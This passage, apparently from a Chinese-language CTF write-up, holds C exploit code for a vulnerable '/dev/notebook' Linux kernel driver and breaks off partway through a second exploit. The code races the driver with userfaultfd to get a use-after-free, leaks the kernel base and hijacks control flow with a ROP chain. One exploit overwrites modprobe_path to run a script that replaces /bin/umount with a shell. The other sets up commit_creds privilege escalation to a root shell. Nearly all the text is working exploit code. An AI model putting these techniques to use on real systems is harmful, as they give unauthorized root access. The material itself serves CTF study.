class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">noteedit</span><span class="params">(<span class="keyword">uint64_t</span> idx, <span class="keyword">uint64_t</span> size, <span class="keyword">char</span>* buf)</span></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">userarg</span> <span class="title">arg</span> =</span> &#123;</span><br><span class="line">        .idx = idx,</span><br><span class="line">        .size = size,</span><br><span class="line">        .buf = buf,</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    ioctl(g_fd, <span class="number">0x300</span>, &amp;arg);    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">notegift</span><span class="params">(<span class="keyword">char</span>* buf)</span></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">userarg</span> <span class="title">arg</span> =</span> &#123;</span><br><span class="line">        .idx = <span class="number">0</span>,</span><br><span class="line">        .size = <span class="number">0</span>,</span><br><span class="line">        .buf = buf,</span><br><span class="line">    &#125;;   </span><br><span class="line"></span><br><span class="line">    ioctl(g_fd, <span class="number">0x64</span>, &amp;arg);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">write_note</span><span class="params">(<span class="keyword">char</span>* con_buf, <span class="keyword">uint64_t</span> idx)</span></span>&#123;</span><br><span class="line">    write(g_fd,con_buf,idx);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">read_note</span><span class="params">(<span class="keyword">char</span>* con_buf, <span class="keyword">uint64_t</span> idx)</span></span>&#123;</span><br><span class="line">    read(g_fd,con_buf,idx);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span>* <span class="title">edit_thread</span><span class="params">()</span></span>&#123;</span><br><span class="line">    noteedit(<span class="number">0</span>, <span class="number">0x100</span>, addr);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span>* <span class="title">add_thread</span><span class="params">()</span></span>&#123;</span><br><span class="line">    noteadd(<span class="number">0</span>,<span class="number">0x20</span>,addr);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">prepare</span><span class="params">()</span></span>&#123; </span><br><span class="line">    system(<span class="string">&quot;echo &#x27;#!/bin/sh\nrm /bin/umount\necho -e \&quot;#!/bin/sh\\nexec 0&lt;/dev/console\\nexec 1&gt;/dev/console\\nexec 2&gt;/dev/console\\n/bin/sh\\n\&quot; &gt; /bin/umount\nchmod 777 /bin/umount&#x27; &gt; /tmp/x&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;echo &#x27;chmod 777 /flag&#x27; &gt;&gt; /tmp/x&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;chmod +x /tmp/x&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;echo -ne &#x27;\\xff\\xff\\xff\\xff&#x27; &gt; /tmp/dummy&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;chmod +x /tmp/dummy&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(fork()) &#123;</span><br><span class="line">        sleep(<span class="number">20</span>);                          </span><br><span class="line">        system(<span class="string">&quot;/tmp/dummy 2&gt;/dev/null&quot;</span>);</span><br><span class="line">        system(<span class="string">&quot;ls -l /flag&quot;</span>);</span><br><span class="line">        system(<span class="string">&quot;cat /flag&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    prepare();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> *ret_buf = <span class="built_in">malloc</span>(<span class="number">0x60</span>);</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">int</span> fd[<span class="number">0x100</span>];</span><br><span class="line">    <span class="keyword">uint64_t</span> leak_addr;</span><br><span class="line">    <span class="keyword">int</span> index;</span><br><span class="line">    g_fd = open(<span class="string">&quot;/dev/notebook&quot;</span>,<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 1. notebook[0].note = heap1 / notebook[0].size = 0x20</span></span><br><span class="line">    <span class="keyword">char</span>* name = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="built_in">memset</span>(name, <span class="string">&#x27;a&#x27;</span>, <span class="number">18</span>);</span><br><span class="line">    noteadd(<span class="number">0</span>,<span class="number">0x20</span>,name);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2. using userfaultfd to produce UAF: notebook[0].note = heap1 / notebook[0].size = 0x100</span></span><br><span class="line">    addr = mmap(<span class="literal">NULL</span>, <span class="number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    RegisterUserfault(addr, userfaultfd_leak_handler);</span><br><span class="line">    <span class="keyword">pthread_t</span> thr_edit,thr_add;</span><br><span class="line">    pthread_create(&amp;thr_edit, <span class="literal">NULL</span>, edit_thread, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 3. set notebook size to enable read/write : notebook[0].note = heap1 / notebook[0].size = 0x20</span></span><br><span class="line">    pthread_create(&amp;thr_add, <span class="literal">NULL</span>, add_thread, <span class="number">0</span>);</span><br><span class="line">    <span class="comment">// sleep(1);   //ç»™1sç¼“å†²æ—¶é—´ï¼Œè®©sizeå€¼å†™ä¸Š</span></span><br><span class="line">    </span><br><span class="line"><span class="comment">// 4. get heap1 back, then we can use the UAF</span></span><br><span class="line">    <span class="keyword">for</span>(i =<span class="number">0</span> ;i&lt;<span class="number">100</span>; i++)&#123;</span><br><span class="line">        fd[i] = open(<span class="string">&quot;/proc/self/stat&quot;</span>,<span class="number">0</span>);              <span class="comment">// in kernel it will kmalloc(0x20)</span></span><br><span class="line">        read_note(ret_buf, <span class="number">0</span>);                          <span class="comment">// check whether we hit heap1 or not</span></span><br><span class="line">        leak_addr = *(<span class="keyword">int64_t</span> *)ret_buf;</span><br><span class="line">        <span class="keyword">if</span>(((leak_addr&amp;<span class="number">0xffffffff00000000</span>) &gt;&gt; <span class="number">32</span>) == <span class="number">0xFFFFFFFF</span>)&#123;</span><br><span class="line">            index = i;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;found it! the index is %d\n&quot;</span>,index);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(i == <span class="number">100</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;failed to get heap1 back, let&#x27;s try again!\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;  </span><br><span class="line"></span><br><span class="line"><span class="comment">// 5. leak kernel base: read heap1</span></span><br><span class="line">    kernel_base = leak_addr - (single_start_func - bzImage_base);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;kernel_base : 0x%lx\n&quot;</span>,kernel_base);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 6. hijack control flow: write heap1, then trigger &#x27;seq_operations-&gt;start&#x27;</span></span><br><span class="line">    <span class="keyword">uint64_t</span> control_rip = add_rsp_1a8 - bzImage_base + kernel_base;</span><br><span class="line">    write_note((<span class="keyword">char</span>*)&amp;control_rip,<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 7. stack pivoting: use the gift func ^_^</span></span><br><span class="line">    noteadd(<span class="number">1</span>,<span class="number">0x60</span>,name);</span><br><span class="line">    notegift(ret_buf);</span><br><span class="line">    heap_addr = *(<span class="keyword">int64_t</span> *)(ret_buf+<span class="number">0x10</span>);                 <span class="comment">// heap addr</span></span><br><span class="line">    <span class="keyword">uint64_t</span> gadget_buf[<span class="number">0x60</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    gadget_buf[<span class="number">0</span>] = pop_rax_ret - bzImage_base + kernel_base;</span><br><span class="line">    gadget_buf[<span class="number">1</span>] = <span class="number">0x782f706d742f</span>;                                     <span class="comment">// /tmp/x</span></span><br><span class="line">    gadget_buf[<span class="number">2</span>] = pop_rdi_ret - bzImage_base + kernel_base;</span><br><span class="line">    gadget_buf[<span class="number">3</span>] = modprobe_path_addr - bzImage_base + kernel_base;</span><br><span class="line">    gadget_buf[<span class="number">4</span>] = mov_ptr_rdi_rax - bzImage_base + kernel_base;           <span class="comment">// write modprobe_path</span></span><br><span class="line">    gadget_buf[<span class="number">5</span>] = do_task_dead_func - bzImage_base + kernel_base;</span><br><span class="line">    write_note(gadget_buf,<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    pop_rsp_ret = pop_rsp_ret - bzImage_base + kernel_base;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 8. trigger</span></span><br><span class="line">    temp_fd = fd[index];</span><br><span class="line">    __asm__(</span><br><span class="line">        <span class="string">&quot;mov r15, 0x15151515;&quot;</span>     <span class="comment">// r15</span></span><br><span class="line">        <span class="string">&quot;mov r14, 0x14141414;&quot;</span>      <span class="comment">// r14 /tmp/x</span></span><br><span class="line">        <span class="string">&quot;mov r13, 0x13131313;&quot;</span>      <span class="comment">// r13</span></span><br><span class="line">        <span class="string">&quot;mov r12, 0x12121212;&quot;</span>      <span class="comment">// r12</span></span><br><span class="line">        <span class="string">&quot;mov r11, 0x11111111;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r10, 0x10101010;&quot;</span>      <span class="comment">// r10</span></span><br><span class="line">        <span class="string">&quot;mov rbp, pop_rsp_ret;&quot;</span>      <span class="comment">// bbbbbbbb</span></span><br><span class="line">        <span class="string">&quot;mov rbx, heap_addr;&quot;</span>      <span class="comment">// aaaaaaaa</span></span><br><span class="line">        <span class="string">&quot;mov r9, 0x99999999;&quot;</span>       <span class="comment">// r9</span></span><br><span class="line">        <span class="string">&quot;mov r8, 0x88888888;&quot;</span>       <span class="comment">//r8</span></span><br><span class="line">        <span class="string">&quot;mov rcx, 0xcccccccc;&quot;</span></span><br><span class="line">        <span class="string">&quot;xor rax, rax;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rdx, 0x22222222;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rsi, 0x33333333;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rdi, temp_fd;&quot;</span></span><br><span class="line">        <span class="string">&quot;syscall&quot;</span></span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    pthread_exit(<span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>



        <h3 id="exp2"   >
          <a href="#exp2" class="heading-link"><i class="fas fa-link"></i></a><a href="#exp2" class="headerlink" title="exp2"></a>exp2</h3>
      <blockquote>
<p>commit_creds(prepare_cred(0))æ‰§è¡Œå®Œæˆåï¼ŒROPé“¾æ‰§è¡Œswapgs_restore_regs_and_return_to_usermode(), æå‰è®¾ç½®å¥½è¿”å›ç”¨æˆ·æ€çš„ripï¼Œè·å¾—root shell</p>
</blockquote>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/userfaultfd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;poll.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;poll.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> g_fd = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">char</span>* addr;</span><br><span class="line"><span class="keyword">uint64_t</span> temp_buf[<span class="number">0x20</span>];</span><br><span class="line"><span class="keyword">int</span> temp_fd;</span><br><span class="line"><span class="keyword">uint64_t</span> heap_addr;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PAGE_SIZE sysconf(_SC_PAGE_SIZE)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">uint64_t</span> single_start_func = <span class="number">0xFFFFFFFF8128C230</span>;</span><br><span class="line"><span class="keyword">uint64_t</span> bzImage_base = <span class="number">0xFFFFFFFF81000000</span>;</span><br><span class="line"><span class="keyword">uint64_t</span> kernel_base;</span><br><span class="line"><span class="keyword">uint64_t</span> pop_rdi_ret = <span class="number">0xffffffff81007115</span>;</span><br><span class="line"><span class="keyword">uint64_t</span> add_rsp_1a8 = <span class="number">0xffffffff816473a4</span>;</span><br><span class="line"><span class="keyword">uint64_t</span> pop_rsp_ret = <span class="number">0xffffffff810bc110</span>;</span><br><span class="line"><span class="keyword">uint64_t</span> kpti_trampoline_addr = <span class="number">0xFFFFFFFF81A0093F</span>;</span><br><span class="line"><span class="keyword">uint64_t</span> pop_rsi_pop_rdx_pop_ret = <span class="number">0xffffffff810d7324</span>;</span><br><span class="line"><span class="keyword">uint64_t</span> pop_rbp_ret = <span class="number">0xffffffff81478d44</span>;</span><br><span class="line"><span class="keyword">uint64_t</span> mov_rdi_rax_pop_ret = <span class="number">0xffffffff8110d81a</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">uint64_t</span> cc_addr = <span class="number">0xFFFFFFFF810A9B40</span>;</span><br><span class="line"><span class="keyword">uint64_t</span> pkc_addr = <span class="number">0xFFFFFFFF810A9EF0</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">note</span>&#123;</span></span><br><span class="line">	<span class="keyword">uint64_t</span> note;</span><br><span class="line">	<span class="keyword">uint64_t</span> size;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">userarg</span>&#123;</span></span><br><span class="line">    <span class="keyword">uint64_t</span> idx;</span><br><span class="line">    <span class="keyword">uint64_t</span> size;</span><br><span class="line">    <span class="keyword">char</span>* buf;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">ErrExit</span><span class="params">(<span class="keyword">char</span>* err_msg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(err_msg);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span>* <span class="title">userfaultfd_leak_handler</span><span class="params">(<span class="keyword">void</span>* arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffd_msg</span> <span class="title">msg</span>;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> uffd = (<span class="keyword">unsigned</span> <span class="keyword">long</span>) arg;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pollfd</span> <span class="title">pollfd</span>;</span></span><br><span class="line">    <span class="keyword">int</span> nready;</span><br><span class="line">    </span><br><span class="line">    pollfd.fd = uffd;</span><br><span class="line">    pollfd.events = POLLIN;</span><br><span class="line">    nready = poll(&amp;pollfd, <span class="number">1</span>, <span class="number">-1</span>);</span><br><span class="line">    sleep(<span class="number">30</span>);</span><br><span class="line">    <span class="comment">// pause();</span></span><br><span class="line">    <span class="keyword">if</span> (nready != <span class="number">1</span>) ErrExit(<span class="string">&quot;[-] Wrong poll return val&quot;</span>);</span><br><span class="line"></span><br><span class="line">    nready = read(uffd, &amp;msg, <span class="keyword">sizeof</span>(msg));</span><br><span class="line">    <span class="keyword">if</span> (nready &lt;= <span class="number">0</span>) ErrExit(<span class="string">&quot;[-] msg err&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span>* page = (<span class="keyword">char</span>*) mmap(<span class="literal">NULL</span>, PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (page == MAP_FAILED) ErrExit(<span class="string">&quot;[-] mmap err&quot;</span>);</span><br><span class="line">    <span class="built_in">memset</span>(page, <span class="number">0</span>, <span class="keyword">sizeof</span>(page));</span><br><span class="line">    </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_copy</span> <span class="title">uc</span>;</span></span><br><span class="line">    uc.src = (<span class="keyword">unsigned</span> <span class="keyword">long</span>) page;</span><br><span class="line">    uc.dst = (<span class="keyword">unsigned</span> <span class="keyword">long</span>) msg.arg.pagefault.address &amp; ~(PAGE_SIZE - <span class="number">1</span>);</span><br><span class="line">    uc.len = PAGE_SIZE;</span><br><span class="line">    uc.mode = <span class="number">0</span>;</span><br><span class="line">    uc.copy = <span class="number">0</span>;</span><br><span class="line">    ioctl(uffd, UFFDIO_COPY, &amp;uc);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] leak handler done&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">RegisterUserfault</span><span class="params">(<span class="keyword">void</span> *fault_page,<span class="keyword">void</span> *handler)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">pthread_t</span> thr;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_api</span> <span class="title">ua</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_register</span> <span class="title">ur</span>;</span></span><br><span class="line">    <span class="keyword">uint64_t</span> uffd  = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);</span><br><span class="line">    ua.api = UFFD_API;</span><br><span class="line">    ua.features = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (ioctl(uffd, UFFDIO_API, &amp;ua) == <span class="number">-1</span>)</span><br><span class="line">        ErrExit(<span class="string">&quot;[-] ioctl-UFFDIO_API&quot;</span>);</span><br><span class="line"></span><br><span class="line">    ur.range.start = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)fault_page;     <span class="comment">//æˆ‘ä»¬è¦ç›‘è§†çš„åŒºåŸŸ</span></span><br><span class="line">    ur.range.len   = PAGE_SIZE;</span><br><span class="line">    ur.mode        = UFFDIO_REGISTER_MODE_MISSING;</span><br><span class="line">    <span class="keyword">if</span> (ioctl(uffd, UFFDIO_REGISTER, &amp;ur) == <span class="number">-1</span>)    <span class="comment">//æ³¨å†Œç¼ºé¡µé”™è¯¯å¤„ç†</span></span><br><span class="line">        ErrExit(<span class="string">&quot;[-] ioctl-UFFDIO_REGISTER&quot;</span>);</span><br><span class="line">    <span class="keyword">int</span> s = pthread_create(&amp;thr, <span class="literal">NULL</span>,handler, (<span class="keyword">void</span>*)uffd);</span><br><span class="line">    <span class="keyword">if</span> (s!=<span class="number">0</span>)</span><br><span class="line">        ErrExit(<span class="string">&quot;[-] pthread_create&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">noteadd</span><span class="params">(<span class="keyword">uint64_t</span> idx, <span class="keyword">uint64_t</span> size, <span class="keyword">char</span>* buf)</span></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">userarg</span> <span class="title">arg</span> =</span> &#123;</span><br><span class="line">        .idx = idx,</span><br><span class="line">        .size = size,</span><br><span class="line">        .buf = buf,</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    ioctl(g_fd, <span class="number">0x100</span>, &amp;arg);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">notedel</span><span class="params">(<span class="keyword">uint64_t</span> idx)</span></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">userarg</span> <span class="title">arg</span> =</span> &#123;</span><br><span class="line">        .idx = idx,</span><br><span class="line">        .size = <span class="number">0</span>,</span><br><span class="line">        .buf = <span class="number">0</span>,</span><br><span class="line">    &#125;;</span><br><span class="line">    </span><br><span class="line">    ioctl(g_fd, <span class="number">0x200</span>, &amp;arg);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">noteedit</span><span class="params">(<span class="keyword">uint64_t</span> idx, <span class="keyword">uint64_t</span> size, <span class="keyword">char</span>* buf)</span></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">userarg</span> <span class="title">arg</span> =</span> &#123;</span><br><span class="line">        .idx = idx,</span><br><span class="line">        .size = size,</span><br><span class="line">        .buf = buf,</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    ioctl(g_fd, <span class="number">0x300</span>, &amp;arg);    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">notegift</span><span class="params">(<span class="keyword">char</span>* buf)</span></span>&#123;</span><br><span class="line">    <span class="class"><span 